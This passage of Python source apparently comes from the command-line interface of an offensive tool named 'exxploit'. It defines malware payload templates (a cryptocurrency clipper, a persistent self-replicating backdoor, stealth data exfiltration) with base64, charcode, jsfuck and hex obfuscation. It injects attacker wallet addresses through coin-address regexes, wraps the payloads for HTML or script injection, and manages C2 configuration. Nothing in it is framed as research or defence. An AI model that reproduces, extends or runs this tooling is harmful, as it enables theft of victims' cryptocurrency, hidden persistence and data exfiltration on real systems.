            'payloads': ['evasion', 'clipboard'],
            'context': 'html',
            'obfuscation': 'base64',
        },
        'crypto_clipper': {
            'description': 'Cryptocurrency address replacement clipper',
            'payloads': ['evasion', 'miner'],
            'context': 'script',
            'obfuscation': 'charcode',
        },
        'persistent_backdoor': {
            'description': 'Multi-stage loader with persistence',
            'payloads': ['evasion', 'camouflage', 'virus', 'replicate'],
            'context': 'html',
            'obfuscation': 'jsfuck',
        },
        'stealth_recon': {
            'description': 'Silent data exfiltration and reconnaissance',
            'payloads': ['evasion', 'camouflage', 'exfil'],
            'context': 'html',
            'obfuscation': 'hex',
        },
    }
    
    if action == 'create' and name and name in payload_templates:
        template = payload_templates[name]
        
        # Process wallet overrides
        variables = {}
        if wallet:
            clipper_config = {
                'addresses': {},
                'patterns': {
                    'btc': '/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[a-z0-9]{25,39}$/i',
                    'eth': '/^0x[a-fA-F0-9]{40}$/i',
                    'xmr': '/^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/i',
                    'ltc': '/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$|^(ltc1)[a-z0-9]{39,59}$/i',
                    'sol': '/^[1-9A-HJ-NP-Za-km-z]{32,44}$/',
                    'doge': '/^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/i',
                    'trx': '/^T[1-9A-HJ-NP-Za-km-z]{33}$/',
                    'xrp:': '/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/',
                    'bnb': '/^(bnb1)[a-z0-9]{38}$/i',
                    'ada': '/^addr1[a-z0-9]{58,}$/i'
                },
                'logUrl': None
            }
            
            for w in wallet:
                try:
                    coin, addr = w.split(':', 1)
                    clipper_config['addresses'][coin.lower()] = addr
                except ValueError:
                    console.print(f"[red]Invalid wallet format: {w}. Use coin:address[/red]")
            
            variables['CLIPPER_CONFIG'] = clipper_config

        payload = factory.build_chain(
            template['payloads'], 
            obfuscation=template['obfuscation'],
            variables=variables
        )
        wrapped = factory.CONTEXTS.get(template['context'], factory.CONTEXTS['html']).format(code=payload)
        
        console.print(f"[green]Generated template: {name}[/green]")
        console.print(f"[dim]Payloads: {', '.join(template['payloads'])}[/dim]")
        if wallet:
            console.print(f"[blue]Custom wallets injected: {', '.join(wallet)}[/blue]")
            
        console.print(Panel(wrapped[:500] + "..." if len(wrapped) > 500 else wrapped, title=name))
        return
    
    # Default: list templates
    table = Table(title="Available Payload Templates", expand=True, box=None)
    table.add_column("Name", style="bold cyan", no_wrap=True)
    table.add_column("Description", style="white", ratio=2)
    table.add_column("Payloads", style="magenta", ratio=1)
    table.add_column("Obfuscation", style="yellow", width=12)
    
    for pname, pdata in payload_templates.items():
        table.add_row(
            pname,
            pdata['description'],
            ", ".join(pdata['payloads']),
            pdata['obfuscation']
        )
    
    console.print(table)
    console.print("\n[dim]Usage: exxploit templates create <name> [--wallet coin:address][/dim]")



# --- Config Command ---
@app.command()
def config(
    action: Optional[str] = typer.Argument(None, help="Action: show, set, init"),
    key: Optional[str] = typer.Argument(None, help="Config key (e.g., c2.port)"),
    value: Optional[str] = typer.Argument(None, help="New value"),
):
    """Manage exxploit configuration."""
    config_cmd(action, key, value)


def config_cmd(action: str = None, key: str = None, value: str = None):
    """Internal config command implementation."""
    ensure_config_dir()
    
    if action == 'init':
        # Copy default config to user directory
        default_config_path = Path(__file__).parent / "config" / "default.yaml"
        if default_config_path.exists() and HAS_YAML:
            import shutil
            shutil.copy(default_config_path, CONFIG_FILE)
            console.print(f"[green]✓ Config initialized at: {CONFIG_FILE}[/green]")
        else:
            # Create default config as JSON fallback
            default = load_config()
            config_json = CONFIG_DIR / "config.json"
            with open(config_json, 'w') as f:
                json.dump(default, f, indent=2)
            console.print(f"[green]✓ Config created at: {config_json}[/green]")
            if not HAS_YAML:
                console.print("[dim]Note: Install PyYAML for YAML config support: pip install pyyaml[/dim]")
        return
    
    if action == 'set' and key and value:
        current = load_config()
        parts = key.split('.')
        if len(parts) == 2 and parts[0] in current:
            current[parts[0]][parts[1]] = value
            # Save as JSON (universal fallback)
            config_json = CONFIG_DIR / "config.json"
            with open(config_json, 'w') as f:
                json.dump(current, f, indent=2)
            console.print(f"[green]✓ Set {key} = {value}[/green]")
        else:
            console.print(f"[red]Invalid key: {key}[/red]")
            console.print("[dim]Format: section.key (e.g., c2.port)[/dim]")
        return

    
    # Default: show config
    current = load_config()
    
    console.print(f"\n[bold]Configuration[/bold] [dim]({CONFIG_FILE})[/dim]\n")
    
    for section, values in current.items():
        console.print(f"[cyan]{section}:[/cyan]")
        for k, v in values.items():
            console.print(f"  {k}: [yellow]{v}[/yellow]")
        console.print()
    
    console.print("[dim]Use 'exxploit config init' to create config file[/dim]")
    console.print("[dim]Use 'exxploit config set <key> <value>' to update[/dim]")


if __name__ == "__main__":
    app()
